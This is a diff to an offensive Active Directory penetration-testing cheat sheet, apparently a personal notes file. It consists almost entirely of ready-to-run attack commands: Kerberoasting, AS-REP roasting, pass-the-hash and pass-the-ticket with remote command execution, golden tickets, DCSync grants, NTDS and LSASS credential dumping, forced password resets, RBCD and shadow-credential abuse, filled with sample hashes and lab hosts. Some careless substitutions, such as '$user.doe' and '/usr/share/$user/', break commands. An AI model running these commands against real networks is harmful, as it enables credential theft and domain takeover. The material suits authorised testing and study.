@@ -10,7 +10,13 @@ https://github.com/lkarlslund/Adalanche/releases
 nxc smb 192.168.32.0/24
 source /opt/setenv.sh ip domain dc # user pass
 
+# Sync Computer Time
 sudo ntpdate -u $ip && date # (host) sudo service vboxadd-service stop -> sudo rdate -n $dcip, timedatectl set-ntp 0 (for troubleshooting)
+nmap -sV -sC 10.10.10.10 # Detect clock skew automatically
+nmap -sT 10.10.10.10 -p445 --script smb2-time -vv # Compute yourself the difference between the clocks
+sudo date -s "14 APR 2015 18:25:16" # Linux
+net time /domain /set # Windows
+faketime -f '+8h' date
 
 /opt/nmap.sh -H $ip -t All
 mkdir nmap; sudo nmap -s -p- 192.168.32.0/24 -oA nmap/sweep.nmap -T4
@@ -139,9 +145,9 @@ nxc ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast 
 # CVE-2022-33679 ( If you can't crack ASREP hash )
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
-user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
+user@hostname:~$ python CVE-2022-33679.py $dom/User DC01.$dom
 user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
-user@hostname:~$ netexec smb DC01.DOMAIN.LOCAL -k --shares
+user@hostname:~$ netexec smb DC01.$dom -k --shares
 
 # Kerberoasting
 impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom/"
@@ -154,8 +160,8 @@ Rubeus.exe kerberoast /rc4opsec # Kerberoast (RC4 ticket), The tgtdeleg trick is
 
 # Kerberoasting without domain account
 # Prereqs: have a list of users, be able to query KDC
-GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/ 
-Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
+GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.$dom" "$dom"/ 
+Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"$dom" /dc:"dc.$dom" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 
 # Timeroasting
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
@@ -217,22 +223,22 @@ ldapsearch -H ldap://dc.absolute.htb -b "dc=absolute,dc=htb"
 
 
 # Grab Hash (capturing, dumping lsa, dcsync, ..)
-python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1
-python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1
-python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1
-python3 secretsdump.py test.local/john:password123@10.10.10.1
-python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2
+python3 dementor.py -u john -p password123 -d $dom 10.10.10.2 10.10.10.1
+python3 targetedKerberoast.py -d $dom -u john -p password123 --dc-ip 10.10.10.1
+python3 PetitPotam.py -d $dom -u john -p password123 10.10.10.2 10.10.10.1
+python3 secretsdump.py $dom/$user:password123@10.10.10.1
+python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 $dom/$user:password123@10.10.10.2
 
 # Pass the hash
-psexec.py -hashes ":<hash>" <user>@<ip>
-atexec.py -hashes ":<hash>" <user>@<ip> "command"
-wmiexec.py -hashes ":<hash>" <user>@<ip>
-evil-winrm -i <ip>/<domain> -u <user> -H <hash>
-xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
-pth-wmic -U ignite/Administrator%16:16 //192.168.1.105 "select Name from Win32_UserAccount"
+psexec.py -hashes ":$hash" $user@$ip
+atexec.py -hashes ":$hash" $user@$ip "command"
+wmiexec.py -hashes ":$hash" $user@$ip
+evil-winrm -i $ip/$dom -u $user -H $hash
+xfreerdp /u:$user /d:$dom /pth:$hash /v:$ip
+pth-wmic -U $dom/Administrator%16:16 //192.168.1.105 "select Name from Win32_UserAccount"
 pth-smbclient -U "$dom/ADMINISTRATOR%16:16" //192.168.10.100/Share
-smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
-smbclient.py -hashes 00000000000000000000000000000000:16 ignite/Administrator@192.168.1.105
+smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W $dom
+smbclient.py -hashes 00000000000000000000000000000000:16 $dom/Administrator@192.168.1.105
 nxc smb 10.2.0.2/24 -u jarrieta -H ":489a04c09a5debbc9b975356693e179d" -x "whoami"
 nxc mssql 10.2.0.2/24 -u jarrieta -H ":489a04c09a5debbc9b975356693e179d" -x "whoami"
 nxc winrm -u 'pete' -H <ntlm hash> --local-auth -x whoami
@@ -242,29 +248,29 @@ nxc wmi 10.2.0.2/24 -u jarrieta -H ":16" -x "whoami"
 nxc smb 10.2.0.2/24 -u jarrieta -H ":16" -x "whoami"
 secretsdump.py ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:16
 # Add users to group, targeted kerberoast
-getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
-getST.py -hashes :32 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john
-ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
-python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 john
-rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
-rbcd.py -u PC01$ -H LM:NT -t 'CN=PC02,CN=Computers,DC=domain,DC=local' -d domain.local -c 'CN=PC01,CN=Computers,DC=domain,DC=local'  -l DC1.domain.local
-getST.py -spn cifs/PC02 -hashes aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248 -impersonate DA domain.local/PC01\$ # If works, use secretsdump -k to dump 02
-rpcdump.py -hashes 16:16 ignite/Administrator@192.168.1.105
-pth-rpcclient -U ignite/Administrator%16:16 //192.168.1.105
+getTGT.py $dom/$user -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+getST.py -hashes :32 -spn www/server01.$dom -dc-ip 10.10.10.1 -impersonate Administrator $dom/$user
+ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain $dom -dc-ip 10.10.10.1 -spn cifs/$dom john
+python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain $dom -dc-ip 10.10.10.1 john
+rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA $dom/$user
+rbcd.py -u PC01$ -H LM:NT -t 'CN=PC02,CN=Computers,DC=domain,DC=local' -d $dom -c 'CN=PC01,CN=Computers,DC=domain,DC=local'  -l DC1.$dom
+getST.py -spn cifs/PC02 -hashes aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248 -impersonate DA $dom/PC01\$ # If works, use secretsdump -k to dump 02
+rpcdump.py -hashes 16:16 $dom/Administrator@192.168.1.105
+pth-rpcclient -U $dom/Administrator%16:16 //192.168.1.105
 pth-net rpc share list -U "ignite\Administrator%16:16" -S 192.168.1.105
 pth-winexe -U Administrator%16:16 //192.168.1.105 cmd.exe
 pth-curl --ntlm -u Administrator:32 http://192.168.1.105/file.txt
-python lookupsid.py -hashes 16:16 ignite/Administrator@192.168.1.105
-python samrdump.py -hashes 16:16 ignite/Administrator@192.168.1.105
-python reg.py -hashes 16:16 ignite/Administrator@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
-python3 smbpasswd.py n00py.local/administrator@n00py.local -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>
+python lookupsid.py -hashes 16:16 $dom/Administrator@192.168.1.105
+python samrdump.py -hashes 16:16 $dom/Administrator@192.168.1.105
+python reg.py -hashes 16:16 $dom/Administrator@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
+python3 smbpasswd.py $dom/administrator@$dom -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>
 kerberos::golden /user:raaz /domain:ignite.local /sid:S-1-5-21-1255168540-3690278322-1592948969 /krbtgt:5cced0cb593612f08cf4a0b4f0bcb017 /id:500 /ptt
 bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!' # Using bloodyAD with pass-the-hash to change password, GenericAll/GenericWrite/Owns - User
 bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B add dcsync user2 # Give DCSync right to the principal identity, WriteDACL - Domain
 
 
 # Get the Ticket / Cache
-python3 gettgtpkinit.py test.local/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache
+python3 gettgtpkinit.py $dom/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache
 mimikatz "kerberos::list /export" # List and export all the tickets
 mimikatz "kerberos::ask /target:cifs/dc1.ignite.local" # When will this work ?
 mimikatz "kerberos::tgt" # List TGTs
@@ -278,18 +284,18 @@ Rubeus.exe ptt /ticket:"base64 | file.kirbi"
 kerberos::ptt $ticket_kirbi_files
 kerberos::ptt $ticket_ccache_file
 export KRB5CCNAME="$(pwd)"/ticket.ccache
-ssh -o GSSAPIAuthentication=yes user@domain.local -vv
-secretsdump.py -k PC02.domain.local
+ssh -o GSSAPIAuthentication=yes user@$dom -vv
+secretsdump.py -k PC02.$dom
 ticketConverter.py ticket.kirbi ticket.ccache
 ticketConverter.py ticket.ccache ticket.kirbi
 KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb
 psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/yashika@WIN-S0V7KMTVLD2.ignite.local
-KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773 # gettgtpkinit is pre-req
+KRB5CCNAME=out.ccache python3 getnthash.py $dom/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773 # gettgtpkinit is pre-req
 mimikatz "kerberos::ptt ticket.kirbi misc::cmd" # whoami will return your name pre-ptt, must test by access or executing something you couldn't before
 mimikatz "kerberos::ptc ticket.ccache misc::cmd"
 mimikatz "kerberos::ptt ticket.ccache misc::cmd"
 get4uticket.py # In TGT, Out TGS
-secretsdump.py -k $TARGET
+secretsdump.py -k $dc
 netexec smb $TARGETS -k --sam
 netexec smb $TARGETS -k --lsa
 netexecETS -k --ntds
@@ -307,8 +313,8 @@ netexec smb $TARGETS -k -x whoami
 .\PsExec.exe -accepteula \\$TARGET cmd
 
 # Pass the Certificate
-python3 gettgtpkinit.py test.local/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache 
-KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773
+python3 gettgtpkinit.py $dom/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache 
+KRB5CCNAME=out.ccache python3 getnthash.py $dom/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773
 gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE" # Base64-encoded PFX certificate (string) (password can be set)
 gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE" # PEM certificate (file) + PEM private key (file)
 certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
@@ -317,7 +323,7 @@ openssl pkcs12 -in file.pfx -out pub.pem -nokeys
 openssl pkcs12 -in file.pfx -out priv.pem # Enter passwd and verify
 certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt" # extract key and cert from the pfx
 certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"
-passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate # elevate a user for DCSYNC with passthecert.py
+passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "$dom" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate # elevate a user for DCSYNC with passthecert.py
 evil-winrm -i $ip -P 5986 -c pub.pem -k priv.pem -S -r $dom
 getS4Uproxy.py
 getS4Uself.py
@@ -336,6 +342,14 @@ mimikatz "privilege::debug sekurlsa::pth /user:Administrator /domain:igntie.loca
 getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET # with an AES (128 or 256 bits) key (pass-the-key)
 
 --- 
+
+# Adalanche
+adalanche collect activedirectory --domain $dom --username $user --password $pass
+adalanche collect activedirectory --domain $dom --username $user --password $pass --server $ip
+adalanche -domain $dom -username $user -password $pass dump
+adalanche -domain contoso.local analyze
+adalanche -domain $dom analyze
+---
 
 # Generic All (set yourself as owner and grant fullcontrol, targeted kerberoast, reset password, targeted asreproast)
 python3 owneredit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
@@ -378,16 +392,18 @@ Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304} -Verbos
 # Targeted Kerberoasting
 bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get object <UserName> --attr serviceprincipalname # Check if current user has already an SPN setted:
 bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname -v 'ops/whatever1'
-GetUsersSPNs.py -dc-ip 10.10.10.10 'attack.lab/john.doe:Password123*' -request-user <UserName> # Grab the ticket
+GetUsersSPNs.py -dc-ip 10.10.10.10 'attack.lab/$user.doe:Password123*' -request-user <UserName> # Grab the ticket
 bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname # Remove the SPN
 # Targeted ASREP Roasting
 bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] add uac [Target_User] -f DONT_REQ_PREAUTH # Modify the userAccountControl
 GetNPUsers.py DOMAIN/target_user -format <[hashcat|john]> -outputfile <file> # Grab the ticket
 bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] remove uac [Target_User] -f DONT_REQ_PREAUTH # Set back the userAccountControl
 # Change their password
-bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!' # Using bloodyAD with pass-the-hash
+bloodyAD --host $ip -d $dom -u $user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!' # Using bloodyAD with pass-the-hash
+bloodyAD --host $ip -d $dom -u $user -p $pass set password $target_user 'Password123!'
+python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set password Molly.Smith 'Password123!'
 # Change their password
-rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd"
+rpcclient -U "$user%$pass" -W $dom -c "setuserinfo2 target_user 23 target_newpwd"
 # Change script path
 bloodyAD --host 10.0.0.5 -d example.lab -u attacker -p 'Password123*' set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.bat'
 # Change script path
@@ -422,7 +438,7 @@ impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom"/"$
 Set-ADAccountPassword victim_user -Reset # Access additional services that requires password. May need to add Reset Password right. Consider obtaining old NT hash after
 mimikatz "privilege::debug lsadump::changentlm /server:$dc /user:victim_user /old:NT /newpassword:Password123!" 
 mimikatz "privilege::debug lsadump::setntlm /server:$dc /user:victim_user /password:Password123!"
-python3 smbpasswd.py n00py.local/administrator@n00py.local -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>
+python3 smbpasswd.py $dom/administrator@$dom -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>
 SPN-Jacking.py # If the "listed SPN" already belongs to an object, it must be removed from it first. This would require the same privileges (GenericAll, GenericWrite, etc.) over the SPN owner as well (a.k.a. "Live SPN-jacking"). Else, the SPN can be simply be added to the target object (a.k.a. "Ghost SPN-jacking"). 
 
 # Generic Write - Computer (RBCD, Shadow Credentials)
@@ -457,8 +473,8 @@ bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F38
 # Give DC Sync right, Linux/Windows
 Import-Module .\PowerView.ps1 
 $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force # Give DCSync right to the principal identity
-$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
-Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local
+$Cred = New-Object System.Management.Automation.PSCredential('$dom\user1', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain $dom
 
 # WriteDACL (Non-Privileged) - OU 
 # Add full control ACE to OU and specify that the ACE should be inherited
@@ -489,7 +505,7 @@ Powerview> Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'contr
 Set-ADAccountPassword victim_user -Reset # Access additional services that requires password. May need to add Reset Password right. Consider obtaining old NT hash after
 mimikatz "privilege::debug lsadump::changentlm /server:$dc /user:victim_user /old:NT /newpassword:Password123!" 
 mimikatz "privilege::debug lsadump::setntlm /server:$dc /user:victim_user /password:Password123!"
-python3 smbpasswd.py n00py.local/administrator@n00py.local -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>
+python3 smbpasswd.py $dom/administrator@$dom -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>
 
 # ReadLAPSPassword
 # An attacker can read the LAPS password of the computer account this ACE applies to.
@@ -517,7 +533,7 @@ ConvertFrom-ADManagedPasswordBlob $mp # Decode the data structure using the DSIn
 bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password target_user target_newpwd
 bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p password123 set password target_user target_newpwd
 # ForceChangePassword Linux
-rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
+rpcclient -U '$user%$pass' -W DOMAIN -c "setuserinfo2 $target 23 'Password123\!'" $ip
 # ForceChangePassword Windows
 $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
@@ -534,9 +550,9 @@ Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 
 # AddKeyCredentialLink (Shadow credential attack)
 python pywhisker.py -d $dom -u $user -k -t "winrm_user" --action "add"  --dc-ip $ip # -no-pass
-python pywhisker.py -d "n00py.local" -u "n00py" -p "PasswordForn00py" --target "esteban_da" --action "add" --filename hax
-python gettgtpkinit.py -cert-pfx hax.pfx -pfx-pass dfeiecA9SZN75zJ7P5Zs n00py.local/esteban_da esteban_da.ccache
-python getnthash.py -key 571d3d9f833365b54bd311a906a63d95da107a8e7457e8ef01b36810daadf243 n00py.local/esteban_da
+python pywhisker.py -d "$dom" -u "n00py" -p "PasswordForn00py" --target "esteban_da" --action "add" --filename hax
+python gettgtpkinit.py -cert-pfx hax.pfx -pfx-pass dfeiecA9SZN75zJ7P5Zs $dom/esteban_da esteban_da.ccache
+python getnthash.py -key 571d3d9f833365b54bd311a906a63d95da107a8e7457e8ef01b36810daadf243 $dom/esteban_da
 .\Whisker.exe add /target:victim_user /domain:$dom # Then run Rubeus asktgt command that's output
 
 # WriteProperty over WriteSPN
@@ -624,8 +640,8 @@ LDAP filter of '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
 # Prereqs: So pwn KCD, WriteSPN||GenericWrite||GenericAll Privs on ServerB SPN (if live jacking needed), WriteSPN||GenericWrite||GenericAll over ServerC (target) 
 # Out: Pass the Cache / Pass the Ticket
 findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD" # 1. show SPNs listed in the KCD configuration
-addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local' # 2. remove SPN from ServerB if required (live SPN-jacking)
-addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local' # 3. add SPN to serverC
+addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.$dom' # 2. remove SPN from ServerB if required (live SPN-jacking)
+addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.$dom' # 3. add SPN to serverC
 getST -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:$PASSWORD' # 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
 tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC" # 5. Edit the ticket's SPN (service class and/or hostname)
 
@@ -677,7 +693,7 @@ lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
 # Local Admin - Dump Credentials from AD Domain (pth, crack passwords, ptt, create tickets, abuse certificates, opth)
 ntdsutil
 $key = Get-BootKey -SystemHiveFilePath 'C:\SYSTEM' ; $key ; Get-ADDBAccount -BootKey $key -DatabasePath 'C:\ntdsutil\Active Directory\ntds.dit' -SamAccountName victim_user
-secretsdump.py '<domain>/<user>:<pass>'@<ip>
+secretsdump.py '$dom/$user:<pass>'@$ip
 gui.windows # Task Manager -> Details -> right click lsass.exe -> create dump file (stored in user's AppData\Local\Temp directory)
 procdump.exe -accepteula -ma lsass.exe out.dmp
 get-process lsass
@@ -691,7 +707,7 @@ sekurlsa::logonPasswords
 pypykatz lsa minidump lsass.DMP 
 nxc smb 192.168.0.76 -u testadmin -p Password123 -M lsassy
 lsassy -d test.lab -u testadmin -p Password123 192.168.0.76
-/usr/share/john/kirbi2john.py <KRB5_TGS kirbi>  > <Output file name> # If any TGS are dumped
+/usr/share/$user/kirbi2john.py <KRB5_TGS kirbi>  > <Output file name> # If any TGS are dumped
 john --wordlist=/usr/share/wordlists/rockyou.txt TGS_hash
 
 ---
@@ -708,15 +724,15 @@ john --wordlist=/usr/share/wordlists/rockyou.txt TGS_hash
 Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
 Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
 # Collect Certificates Data
-certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
-certipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound
-certipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123
+certipy find 'corp.local/$user:Passw0rd@dc.corp.local' -bloodhound
+certipy find 'corp.local/$user:Passw0rd@dc.corp.local' -old-bloodhound
+certipy find 'corp.local/$user:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123
 # RustHound, Windows with Kerberos session (GSSAPI)
-rusthound.exe -d domain.local --ldapfqdn domain
+rusthound.exe -d $dom --ldapfqdn domain
 # RustHound, Windows Bind
-rusthound.exe -d domain.local -u user@domain.local -p Password123 -o output -z
+rusthound.exe -d $dom -u user@$dom -p Password123 -o output -z
 # RustHound, Linux
-rusthound -d domain.local -u 'user@domain.local' -p 'Password123' -o /tmp/adcs --adcs -z
+rusthound -d $dom -u 'user@$dom' -p 'Password123' -o /tmp/adcs --adcs -z
 # SOAPHound, Windows (Uses ADWS, not LDAP)
 --buildcache: Only build cache and not perform further actions
 --bhdump: Dump BloodHound data
@@ -803,10 +819,10 @@ nxc smb $ip -u $user -p $pass -M petitpotam
 # Pass the hash
 mimikatz "privilege::debug lsadump::changentlm /server:$dc /user:victim_user /old:NT /newpassword:Password123!" # Access additional services that require password
 mimikatz "privilege::debug lsadump::setntlm /server:$dc /user:victim_user /password:Password123!" # Write privs over object
-mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"
-xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
+mimikatz "privilege::debug sekurlsa::pth /user:$user /domain:$dom /ntlm:$hash"
+xfreerdp /u:$user /d:$dom /pth:$hash /v:$ip
 Invoke-WMIExec -Target 192.168.1.105 -Domain ignite -Username Administrator -Hash 32196B56FFE6F45E294117B91A83BF38 -Command "cmd /c mkdir c:\hacked" -Verbose
-wmiexec.exe -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
+wmiexec.exe -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 $dom/Administrator@192.168.1.105
 Rubeus.exe asktgt /domain:igntie.local /user:Administrator /rc4: 32196b56ffe6f45e294117b91a83bf38 /ptt
 
 # Overpass the Hash / Pass the Key (PTK)
